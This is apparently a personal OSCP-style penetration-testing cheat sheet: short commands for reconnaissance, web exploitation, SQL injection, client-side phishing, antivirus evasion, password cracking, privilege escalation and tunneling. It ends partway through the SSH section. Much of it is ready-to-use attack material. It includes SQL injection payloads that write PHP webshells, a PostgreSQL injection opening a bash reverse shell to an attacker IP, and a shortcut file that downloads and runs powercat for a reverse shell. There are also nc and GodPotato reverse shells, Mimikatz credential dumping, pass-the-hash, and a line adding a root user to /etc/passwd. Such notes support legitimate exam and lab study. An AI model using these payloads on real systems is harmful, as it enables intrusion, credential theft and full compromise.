**Information Gathering and Enumeration:**

**DNS Enumeration:**

`host www.target.domain`

`host -t txt,mx domain.com`

`dnsrecon -d megacorpone.com -t std`

`dnsrecon -d megacorpone.com -D list.txt -t brt`

`dnsenum megacorpone.com`

`nslookup mail2.megacorpone.com`

`nslookup -type=TXT info.megacorpone.com 8.8.8.8`

**TCP/UDP Port Scanning:**

`nc -nvv -w 1 -z 10.0.0.74 1-1000`

`nc -nv -u -z -w 1 10.0.0.74 1-1000`

`for ip in $(seq 100 200); do nc -nv -z -w 1 -u 192.168.45.44 $ip; done`

`sudo netdiscover -r 10.0.0.0/24`

`sudo nmap -v -sn 192.168.44.0-253 -oG sweep.txt`

`nmap --script-help http-headers`

`sudo nmap -p 445 --script=smb-enum-users 192.168.44.30 -Pn`

`sudo nmap -sV -sC -sU 192.168.44.30 -p 1-1000 -Pn | tee scan.txt`

`sudo masscan -p1-65535,U1:65535 192.168.44.30 --rate=1000 -e tun0`

`Test-NetConnection -Port 445 192.168.45.33`

`1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.44.30", $_)) "TCP port $_ is open"} 2>$null` 

**no TTY shell:**

```(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell (am I running in cmd or PS?)```

`python -c 'import pty; pty.spawn("/bin/bash")'`

**SMB Enumeration:**

`sudo nmap -v -p 139,445 -oG smb.txt 192.168.44.0/24`

`sudo nmap -v -p 139,445 --script=smb-os-discovery 192.168.44.30`

`net view \\\\DC01 /all`

`enum4linux -a 192.168.44.30`

`smbclient -L //192.168.44.30 -U anonymous`

`smbmap -H 192.168.44.30`

**SMTP Enumeration:**

`nc -nv 192.168.44.30 25`
`VRFY root`
`VRFY Administrator`

`Test-NetConnection -Port 25 192.168.44.30`

`dism /online /Enable-Feature /FeatureName:TelnetClient`
	`- grab the telnet client; client can also be transferred from the attacker`
`telnet 192.168.44.30 25`

**SNMP Enumeration:**

`sudo nmap -sU -p 161 --open -oG snmp_open.txt`
`sudo nmap --script-help=*snmp* 192.168.44.30`

`for ip in $(seq 1 254); do echo 192.168.44.\$ip; done > ips.txt`
`onesixtyone -c community -i ips.txt`
	- common community strings: public, private, manager

`snmpwalk -c public -v1 -t 10 192.168.44.30 -Oa` 

`snmpwalk -c public -v1 192.168.44.30 1.3.6.1.4.1.77.1.2.25`
	- enumerate Windows users based on the community string "public"
	- 1.3.6.1.2.1.25.6.3.1.2 for installed software
	- 1.3.6.1.2.1.6.13.1.3 for open TCP ports
	- 1.3.6.1.2.1.25.4.2.1.2 for running processes

**Vulnerability Scanning:**

`cat /usr/share/nmap/scripts/script.db | grep "\\"vuln\\""`

`sudo nmap -sV -p 443 --script "vuln" 192.168.44.30 (specifying a category)`

`sudo nmap --script-updatedb`

**Web Application Attacks:**

1. Enumerating Web Applications:
	a. directories:
	`whatweb https://www.sait.ca`
	
	`nikto -h https://192.168.44.30:8090`
	`dirb https://10.0.2.15:12380 /usr/share/wordlists/dirb/common.txt`
	
	`gobuster dir -u google.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	
	`ffuf -u https://arctic.htb:8500/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -t 100 -recursion -recursion-depth 3 -r -v`

	look in /sitemap.xml and /robots.txt for resources to examine
	check the output of the wappalyzer browser extension 
	
	b. subdomains (must be added to /etc/hosts):
	 `wfuzz -w subdomainWordlist.txt -u http://cmess.thm -H "HOST: FUZZ.cmess.thm"`

	`gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -d google.com`

	c. WordPress:
	`wpscan --url https://10.0.2.15:12380/blogblog/ --enumerate vp,u,vt,tt --verbose --disable-tls-checks --detection-mode aggressive --api-token <token>`

	`wpscan --url http://192.168.250.244:80/ --enumerate ap,u,at,cb,tt --verbose --disable-tls-checks --detection-mode aggressive`

	`wpscan --url http://192.168.250.244:80/ --enumerate p --plugins-detection aggressive`

	`wpscan --url http://192.168.44.30:12380 --verbose`	

	d. API endpoints:
	`gobuster dir -u http://192.168.44.30/ -w /usr/share/wordlists/dirb/big.txt -p pattern`

	 pattern: {GOBUSTER}/v1, {GOBUSTER}/v2, etc. separated by newlines

	`curl --proxy 127.0.0.1:8080 -i http://192.168.40.33/endpoint/v1`

	`gobuster dir -u http://192.168.40.33/endpoint/v1/user1 -w /usr/share/wordlists/dirb/small.txt`

	`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.0.21:5001/users/v1/login`

	`curl -d '{"password":"lab","username":"offsec","email":"[pwn@offsec.com](mailto:pwn@offsec.com)","admin":"True"}' -H 'Content-Type: application/json' http://192.168.0.21:5001/users/v1/register`

	`curl -i <endpoint> -H 'Authorization: OAuth <token>'`

2. XSS:
	a. Enumeration:
	Fuzz input fields with: `< > ' " { } ;`

	`<svg onload=alert('XSS')>`
    `<img src=x onerror=alert(1) />`

	WordPress Core XSS can lead to new admin user + code execution

3. Directory/Path Traversal:
	`curl --path-as-is http://example.com/cms/login.php?language=../../../../.etc/passwd`

	files to look for:
		- /etc/passwd
		- /etc/shadow
		- /home/john/.ssh/id_ed25519, id_ecdsa, id_dsa, etc.
		- C:\\Windows\\System32\\drivers\\etc\\hosts
		- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
		- C:\\inetpub\\wwwroot\\web.config\\

4. File inclusions:
	1. LFI: 
		enumerate service and version for known file inclusion vulnerabilities

		enumerate parameters that take file names as input to include /etc/passwd or C:\\Windows\\System32\\drivers\\etc\\hosts (or index.php base64-encoded)

		try to provide `<?php echo system($_GET['cmd']); ?>` as input to the web application as a User-Agent or other field that will be logged and then exploit LFI to include the log file with ?cmd=ls appended to the end.

		use php wrappers to include arbitrary plain or base64 encoded PHP snippets or PHP files themselves as shown below.	

	2. RFI:
		enumerate service and version for known remote file inclusion vulnerabilities

		`python3 -m http.server 80`

		`curl "http://mountaindesserts.com/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=ls"`

	3. PHP Wrappers:
		1.`http://domain.com/index.php?page=php://filter/resource=localFile.php`
		2.`http://domain.com/index.php?page=php://filter/convert.base64-encode/resource=localFile.php`
		3.`http://domain.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
		4. 
		   `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		   `curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"`
		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
		6. `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"`

5. File Upload Vulnerabilities:
	1. security check bypasses:
		1. .PHP, .pHP
			1. [A list of valid PHP extensions from fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)
		2. file.php%00
		3. .txt.php
		4. intercepting the request after submission and modifying the extension/changing the body, etc.
		5. changing the file's magic number
		6. if you can't upload executables, overwrite SSH keys
		7. intercept the file and make it reference an instance of impacket-smbserver/ntlmrelayx to grab or relay the hash

6. Command Injection:
	1. fuzz input fields with `& && ; |` \` 

**SQL Injection:**
1. identify and fuzz all parameters taken by the application in both GET and POST requests
2. Fuzzing:
	2. `' OR 1=1-- .`
	3. `' ORDER BY 1-- .`
	4. `%' UNION SELECT database(), user(), @@version, null, null -- .`
	5. `' AND 1=2-- .`
	6. `' AND IF (1=1, sleep(3), 'false') -- .`
3. MySQL Basics:
	1. `select version();`
	2. `select system_user();`
	3. `show databases;`
	4. `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
4. MS-SQL Basics:
	1. `impacket-mssqlclient Administrator:Password1#@192.168.44.30 -windows-auth`
	2. `SELECT @@version;`
	3. `SELECT name FROM sys.databases;`
	4. `SELECT * FROM <table-name>.information_schema.tables;`
	5. `select * from sysusers;`
	6. `SELECT * FROM <database-name>.dbo.<table-name>;`
5. Error-Based Payloads:
	1. Fuzz with `' ; " -- .` appended to legitimate input
	2. `username' OR 1=1-- .`
	3. `username' OR 1=1 in (select @@version) -- .`
	4. `username' OR 1=1 in (select * from users)-- .`
	5. `username' OR 1=1 in (select password from users)-- .`
	6. `username' OR 1=1 in (select password from users where username = 'admin')-- .`
6. UNION-based payloads:
	1. `' ORDER BY 1-- .`      (try with 1,2,3,4,5,6 etc.; an error will be returned when the number surpasses the number of columns)
	2. `%' UNION SELECT database(), user(), @@version, null, null -- .`
	3. `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns WHERE table_schema=database() -- .`        (tables and columns of the current database)
	4. `' UNION SELECT null, username, password, description, null FROM users -- .`
7. Blind SQL injection payloads:
	1. `http://domain.com/index.php?user=offsec' AND 1=1 -- .`            (boolean based)
	2. `http://domain.com/index.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- .`         (time-based; this will sleep if the user exists and return false (no sleep) if the user does not exist)
8. SQLi to RCE:
	1. MS-SQL (xp_cmdshell()):
		1. `EXECUTE sp_configure 'show advanced options', 1;`
		2. `RECONFIGURE;`
		3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
		4. `RECONFIGURE;`
		5. `EXECUTE xp_cmdshell 'whoami';`
	2. MySQL (SELECT INTO OUTFILE):
		1. `username' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- .`          (number of columns must be exact; this payload can return an error even on success; payload must be written into an accessible directory)
9. Payloads used during practice:
	1. MySQL SQLi to RCE:
		1. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/test.php' FIELDS TERMINATED BY '<?php phpinfo();?>'; -- +`           (test writing to an accessible file)
		2. `' UNION SELECT @,@,@,@,@; -- +`          (confirm number of columns)
		3. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]);?>'; -- +`          (write the webshell)
	2. PostgreSQL blind time-based SQLi to RCE:
		1. [RCE via PostgreSQLi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
		2. `weight=4&height=4'%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+--+%2b&age=2'&gender=Male'&email=test%40test.com'`             (create the table)
		3. `weight=4&height=4'%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http%3a//192.168.45.204%3a8082/test.txt'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`            (try to pull down an arbitrary file from the attacker)
		4. `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%30%34%2f%34%34%34%34%20%30%3e%26%31%22'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`          
			1. (execute a bash reverse shell; the encoded snippet is: `bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"';--+`)
			2. unencoded exploit: `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`
	3. MS-SQLi to RCE:
		1. [MSSQL injection to RCE](https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
		2. `test' UNION SELECT @@version, null;-- -`     
			1. (correct number of columns will not return an error)
		3. `test'; waitfor delay '0:0:10'-- -`             (enumerate time-based injection)
		4. `admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+` 
		5. `admin' UNION SELECT 1,2; RECONFIGURE--+`
		6. `admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+`
		7. `admin' UNION SELECT 1,2; RECONFIGURE--+`
		8. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/test.txt'-- -`
		9. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/webshell.aspx c:\\inetpub\\wwwroot\webshell.aspx'-- -`

**Client Side Attacks:**
1. `gobuster dir -u "http://192.168.241.199/" -x .pdf,.docx,.pptx -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`
2. `exiftool -a -u filename.pdf`
3. [reverse shell macro to put into an office document](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/macro.vba)
4. [Windows library file/shortcut file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms):
	1. `mkdir /home/kali/webdav/ && pip3 install wsgidav`
	2. `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
	3. save the [Windows library file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms) as config.Library-ms
	4. craft a shortcut file (shortcut.lnk) on Windows with the path being: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8082/powercat.ps1');powercat -c 192.168.45.204 -p 4444 -e powershell"`
	5. serve the .lnk and .Library-ms files in `/home/kali/webdav`
	6. serve [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) on port 8082
	7. `swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --auth-user test@supermagicorg.com --server supermagicorg.com --body 'Please open the attached file promptly.' --attach @/home/kali/webdav/config.Library-ms`


**Locating Public Exploits:**
1. `searchsploit -m windows/remote/34534.rb`
2. `searchsploit -p 34544`
3. `grep exploit /usr/share/nmap/scripts/*.nse`
4. `nmap --script-help=clamav-exec.nse`
5. lab 1:
	1. `cewl -d 3 -w wordlist.txt --with-numbers -e http://10.0.0.174/`
	2. `ffuf -request request.txt -request-proto http -w wordlist.txt:PASSFUZZ`         (PASSFUZZ is placed as parameter in request.txt)
	3. `curl --data-urlencode "cmd=nc -e /bin/bash 192.168.45.204 4444" http://10.0.0.174/project/uploads/users/34535-backdoor.php`


**Fixing Public Exploits:**
1. `msfvenom --arch x86 -p windows/shell/reverse_tcp LPORT=4444 LHOST=192.168.45.204 -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread -f c -e x86/shikata_ga_nai`
2. `requests.post(url, data=data, allow_redirects=False, verify=False)`        (verify=False will allow you to overlook self signed certificates)


**Antivirus Evasion:**
1. [injecting shellcode into memory via powershell](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/ObfuscatedInMemoryInjection.ps1)
2. using shellter:
	1. `sudo apt install wine && dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
	2. `shellter`
3. bypassing Avira with a batch file:
	1. `impacket-smbserver -smb2support share .`
	2. upload/send [BatchReverseShell.bat](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/BatchReverseShell.bat) to the victim
	3. `nc -nvlp 4444`


**Brute Forcing:**
1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.0.0.174`
2. `hydra -L usernames.txt -p "Password1#" rdp://10.0.0.174`
3. brute forcing POST login forms with hydra:
	1. grab authentication request body via Burp
	2. identify the "condition string" (a string in the response to a failed authentication attempt that indicates failure)
	3. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-post-form "/login.php:param1:^USER^&param2=^PASS^:Login failed. Invalid}"`
		1. `"</form.php>:<parameters-and-their-significance>:<condition-string>"`
4. [brute forcing POST login forms with ffuf](https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login):
	1. capture the authentication request using burp and save it as request.txt
	2. replace parameters with USERFUZZ and PASSFUZZ as needed in request.txt
	3. `ffuf -request request.txt -request-proto http -mode clusterbomb -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:USERFUZZ /usr/share/wordlists/rockyou.txt:PASSFUZZ -mc 200`
		1. define status code 200 as successful login (`-mc 200`)
5. brute forcing basic HTTP authentication:
	1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-get /`


**Password/Hash Cracking:**
- Methodology:
	- 1. recover hash/protected material
	- 2. convert data to crackable format using \*2john 
	- 3. calculate cracking duration if needed
	- 4. identify proper wordlist and craft a ruleset
	- 5. run the cracking tool in a suitable environment (GPU for hashcat, CPU for john)
1. Hashcat rules:
	1. `$3`       (append 3 to all words)
	2. `^3`       (prepend 3 to all words)
	3. `c`         (capitalize the first letter, lowercase the rest)
	4. `hashcat -r demo.rule --stdout wordlist.txt`
	5. `$1 $2 c`       (Password12)
		1. rules are applied on a per-line bases; rules will be applied mutually exclusively unless specified on the same line
	6. Common rules: `$1 c $!`      `$2 c $!`       `$1 $2 $3 c $!`
	7. Common pre-made rules:
		1. `/usr/share/hashcat/rules/rockyou-3000.rule`
		2. `/usr/share/hashcat/rules/best64.rule`
	8. `hashcat -m 1000 hash.ntlm /usr/share/wordlists/rockyou.txt -r rule.rule`
2. John rules:
```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
	1. append this to the bottom of /etc/john/john.conf
	2. john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules hash.ssh

3. `hash-id` and `hash-identifier` can be used to identify hash types
4. [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
5. `hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
6. `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash`
7. extracting local Windows hashes:
	1. `Get-LocalUser`
	2. `.\Invoke-Mimikatz` or `Mimikatz.exe`
	3. `privilege::debug`
	4. `token::elevate`
	5. `sekurlsa::logonpasswords`          (extract passwords and hashes)
	6. `lsadump::sam`                                (dump NTLM hashes from SAM)
	7. `hashcat -m 1000 hash.ntlm /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` 
8. Passing NTLM hashes:
	1. Tools: `Mimikatz, crackmapexec, smbclient, impacket-*, WinRM, xfreerdp`
	2. `smbclient //10.0.0.174/secrets -U Administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c`
	3. `impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.174`        (same syntax for wmiexec, smbexec)
9. Capturing and cracking Net-NTLMv2:
	1. `sudo responder -I tun0 --analyze`              (listen for hashes without poisoning)
	2. `dir \\192.168.45.204\share`                     (force an authentication from the victim)
	3. `hashcat -m 5600 hash.netntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.txt`
10. relaying Net-NTLMv2 hashes:
	1. `nc -nvlp 1337`
	2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.174 -c "powershell -EncodedCommand <base64-encoded-PS>"`
	3. `dir \\192.168.45.204\share`      (authenticate to the relay server from the victim)


**Windows Privilege Escalation:**
1. manual enumeration:
	1. `whoami`
	2. `whoami /groups`
	3. `whoami /priv`
	4. `powershell -c "Get-LocalUser"`
		1. `net user`
	5. `powershell -c "Get-LocalGroup"`
		1. `net localgroup`
	6. `powershell -c 'Get-LocalGroup "Domain Admins"'`
	7. `systeminfo`
	8. `ipconfig /all`
	9. `route print`
	10. `netstat -ano`
	11. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`             (enumerate installed 32-bit applications)
	12. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`         (enumerate installed 64-bit applications)
	13. `dir C:\Program Files (x86)`
	14. `dir C:\Program Files`
	15. `powershell -c "Get-Process <process-name> | Format-List *"`         (enumerate running processes)
	16. `Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue`                    (searching for user files)
	17. `runas /user:Administrator cmd.exe`
	18. `Get-History`
	19. `(Get-PSReadlineOption).HistorySavePath`             (locate the PS history file)
	20. `powershell -c "Get-ChildItem -Path C:\Users\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue"`      (enumerate for PS transcript file(s))
	21. `evil-winrm -i 142.53.44.43 -u Administrator -p Password1#`
	22. `Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational → Location of Script Block Logs`
2. automated enumeration for privilege escalation:
	1. `. .\PowerUp.ps1; Invoke-AllChecks -Format HTML`
		1. [List of individual PowerUp.ps1 commands](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
	2. `.\Seatbelt.exe -group=all`
	3. `Get-Content Output.txt | Select-String -Pattern "Installed Product" -Context 0, 60`                 (parse output files)
3. Windows Services for privilege escalation:
	1. `services.msc, Get-Service, Get-CimInstance`
	2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}`            (enumerate running services)
	3. `icacls "C:\xampp\apache\bin\httpd.exe"`            (enumerate service executable permissions)
	4. replacing a service binary ('F' permissions on a service binary):            
		1. (`Get-ModifiableServiceFile`  `Get-ModifiableService`)
		2. `icacls <service-binary>`                 (should be F for current user or group)
		3. `x86_64-w64-mingw32-gcc windows_service.c -o service.exe` 
			1. `service.exe` must be the name of the service being replaced!
			2. use the already written [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c)
		4. `net stop TargetService`
			1. access denied = enumerate Startup Type:
				1. `Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'}` (grab the Startup Type)
				2. Startup Type = auto --> a reboot will restart it (SeShutdown is required)
				3. `shutdown /r /t 0`
		5. `net start TargetService`
		6. `runas /user:added_user cmd.exe`
	6. hijacking a (service's) required DLL:           (`Find-PathDLLHijack`)
		1. `icacls TargetService.exe`        
			1. (if 'F', replace the binary itself; if the service binary's directory is writable, attempt to hijack a required DLL)
		2. copy the service binary to a local Windows machine for analysis via Procmon64.exe as Administrator:
			1. Process Name is TargetService.exe
			2. Result contains NOT FOUND
			3. Path contains dll
		3. `Restart-Service TargetService`             (DLL loading happens at conception)
		4. `x86_64-w64-mingw32-gcc malDll.cpp --shared -o RelyOnMe.dll`
			1. the DLL must have the same name as the missing dependency
			2. use this [malicious DLL](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp)
		5. place the compiled DLL along the DLL search order
		6. `Restart-Service TargetService`
	7. unquoted service paths:                         (`Get-UnquotedService`)
		1. vulnerability: spaces within the path to the service binary, no quotes around the path to the service binary, write permissions on one of the parent directories of the service binary's working directory
		2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` (enumerate running and stopped services)
		3. `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`         
			1. (enumerate unquoted service paths for services outside the System32 directory; does not check for spaces in the binary paths)
		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: `C:\Program Files\Enterprise.exe)
		5. `Restart-Service TargetService`         (this may show an error on success)
	8. abusing scheduled tasks:
		1. `Get-ScheduledTask`
		2. `schtasks /query /fo LIST /v`          (list scheduled tasks and their properties)
		3. `schtasks /query /fo LIST /v | Select-String -Pattern "C:\\Users" -Context 10, 10`                   (scheduled tasks running out of Home directories)
		4. `icacls job.exe`                    (check privileges on the task binary)
		5. `x86_64-w64-mingw32-gcc exploit.c -o <action-name>`
			1. `action-name` must be the same as the task action being replaced
			2. [malicious binary](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/AddUser.c)
	9. abusing user's assigned privileges:
		1. look for:
			1. `SeImpersonatePrivilege`
			2. `SeBackupPrivilege`
			3. `SeAssignPrimaryToken`
			4. `SeLoadDriver`
			5. `SeDebug`
		2. SeImpersonatePrivilege:
			1. [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
				1. `.\PrintSpoofer.exe -i -c powershell.exe`
			2. [GodPotato](https://github.com/BeichenDream/GodPotato)
				1. `.\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"`


**Linux Privilege Escalation:**
1. Manual Enumeration:
	1. `id`
	2. `cat /etc/passwd`
	3. `hostname`
	4. `cat /etc/issue && cat /etc/os-release && arch`
		1. ex: `searchsploit "linux kernel Ubuntu 16 local privilege escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`
	5. `uname -a`
	6. `ps aux`                                       (running processes in a readable format)
	7. `ip a`
	8. `route && routel`
	9. `ss -anp`                              (list connections and their processes)
		1. `netstat -anop`
	10. `cat /etc/iptables/rules.v4`       (dump IPv4 rules)
		1. `cat /etc/iptables | grep iptables-persistent`
		2. `history | grep iptables-save`
		3. `history | grep iptables-restore`
	11. `ls -alh /etc/cron*`
	12. `cat /etc/crontab`
	13. `crontab -l`
	14. `sudo crontab -l`
	15. `grep "CRON" /var/log/syslog`                     (inspect the cron log file)
		1. `cat /var/log/cron.log`
	16. `dpkg -l`
	17. `find / -writable -type d 2>/dev/null`
	18. `find / -writable -type f 2>/dev/null`
	19. `cat /etc/fstab`                     (list drives that will be mounted at boot time)
	20. `mount`                                  (mounted filesystems)
	21. `lslbk`                                  (available disks)
	22. `lsmod`                                  (enumerate loaded kernel modules)
		1. `/sbin/modinfo KernelModule`
	23. `find / -perm -u=s type f 2>/dev/null`                  (SUID files)
	24. `getcap -r / 2>/dev/null`                                          (capabilities; look for +ep)
	25. `env`
	26. `history && cat /home/<user>/.bash_history`
	27. `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh -V`
	28. `sudo -l`
	29. `sudo -i`                                (run a shell as root with root env)
	30. `su -`                                      (switch with new user's env)
	31. `su root`                                (switch to root without switching env)
	32. `sudo -s`                                (run as root without root env)
	33. `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`
	34. `locate password | more`
	35. `find / -name authorized_keys 2> /dev/null`
	36. `find / -name id_* 2> /dev/null`
	37. `find / -name *.pub* 2> /dev/null`
	38. `find / -name *.bak (*backup*, *old*)`
	39. `ls -alh /tmp/`
	40. `watch -n 1 "ps -aux | grep pass"`               
		1. (monitor processes/services for passwords in real time)
	41. `sudo tcpdump -i lo -A | grep "pass"` 
		1. (monitor loopback traffic (local services) for passwords in real time)
	42. `ls -alh /etc/passwd /etc/shadow /etc/sudoers`
		1. any of these files are writable = vulnerable
2. Automated Enumeration:
	1. `unix-privesc-check standard`
	2. `./linpeas.sh`
	3. `./linenum.sh`
3. Exploits for privilege escalation:
	1. writing to a writable /etc/passwd:
		1. `openssl passwd -salt test password`
		2. `echo added_user:$1$skYZQxWx$CeIjblVc4OVHAL.a06q1C/:0:0:root:/root:/bin/bash >> /etc/passwd`
		3. `su added_user`
		4. `id`
	2. pkexec binary with SUID:
		1. [PwnKit](https://github.com/ly4k/PwnKit)
	3. Linux kernel 5.x:
		1. [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
	4. SUID binary or +ep Capabilities:
		1. [GTFOBins](https://gtfobins.github.io/)
	5. Vim as SUID binary:
		1. `/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`
			1. `:py` for python2; `:py3` for python3
	6. local git repository:
		1. `git status`
		2. `git log`                                        (show commit history)
		3. `git show <commit-hash>`            (show changes between commits)


**Port Redirection and SSH tunneling:**
1. port forwarding through a \*NIX host:                               
	1. tools: (`socat, rinetd, netcat + named pipe, iptables`)
	2. `socat -ddd TCP-LISTEN:9998,fork TCP:10.0.0.174:2222`
		1. (bind to 0.0.0.0:9998 and forward that traffic to 10.0.0.174:2222)
		2. (this is a port forward, no need for proxychains)
	3. `socat TCP-LISTEN:2222,fork TCP:10.0.0.174:22`
2. port forwarding through a Windows host:
	1. `ssh.exe -N -R 9999 kali@192.168.45.204`          (bind a SOCKS proxy on attacker)
		1. `%systemdrive%\Windows\system32\OpenSSH`    (default location)
	2. `cmd.exe /c echo y | plink.exe -ssh -l username_1 -pw Password1# -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.204`
		1. `127.0.0.1:9833` is bound on the attacking machine (SSH server)
		2. `127.0.0.1:3389` is the RDP socket on the local (compromised) windows client
		3. `xfreerdp /u:<username> /p:<password> /v:127.0.0.1:9833`
	3. using netsh:
		1. `netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.50.55 
		2. `netstat -anp TCP | find "9999"`
		3. `netsh interface portproxy show all`           (show all forwarding via netsh)
		4. `netsh advfirewall firewall add rule name="RuleOne" protocol=TCP dir=in localip=0.0.0.0 localport=9999 action=allow`
			1. (allow ingress traffic to the bind port)
		5. `netsh advfirewall firewall delete rule name="RuleOne"`
		6. `netsh interface portproxy del v4tov4 listenport=9999 listenaddress=0.0.0.0`
3. tunneling/forwarding via SSH:
	1. 4 types:
		1. SSH Local port forward
			1. (bind port on SSH client --> SSH server --> single destination socket)
		2. Dynamic SSH port forward
			1. (bind SOCKS port on SSH client --> SSH server --> internal network)
		3. SSH remote port forward
			1. (local bind port --> local SSH server --> compromised SSH client --> single destination socket)
		4. SSH remote dynamic port forward
			1. (local bind SOCKS port --> local SSH server --> compromised SSH client --> any destination socket routable from the SSH client)
	2. SSH local port forwarding:
		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		2. `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
